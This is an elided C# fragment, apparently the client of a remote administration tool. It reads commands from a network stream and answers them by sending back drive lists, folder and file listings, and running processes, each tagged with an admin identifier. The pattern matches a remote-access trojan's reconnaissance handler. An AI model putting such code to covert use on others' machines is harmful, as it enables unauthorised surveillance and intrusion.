                ...
                while ((byte_count = ns.Read(receivedBytes, 0, receivedBytes.Length)) > 0)
                {
                    ...
                    try
                    {
                        ...
                        if (d.Contains("GD")) //GetDrives|ADMIN
                        {
                            ...
                            {
                                byte[] bs = Encoding.UTF8.GetBytes("NewDisk|" + str + "|" + admin);
                        ...
                        if (d.Contains("mt"))
                        {
                            string[] splitter = d.Split('|');
                            string admin = splitter[1];
                            string path = splitter[2];
                            try
                            {
                                var directories = Directory.GetDirectories(path);
                                foreach(string dr in directories)
                                {
                                    byte[] bs = Encoding.UTF8.GetBytes("NewFolder|" + dr + "|" + admin);
                                    ns.Write(bs, 0, bs.Length);
                                    Thread.Sleep(30);
                                }
                                ...
                                {
                                    byte[] bs = Encoding.UTF8.GetBytes("NewFiles|" + df + "|" + admin);
                                    ns.Write(bs, 0, bs.Length);
                                    Thread.Sleep(30);
                                }
                            }
                        ...
                        if (d.Contains("LP"))
                        {
                            try
                            {
                                ...
                                foreach (Process proc in allProc)
                                {
                                    ...
                                    string msg = "LP|" + name + "|" + id + "|" + title + "|" + admin;
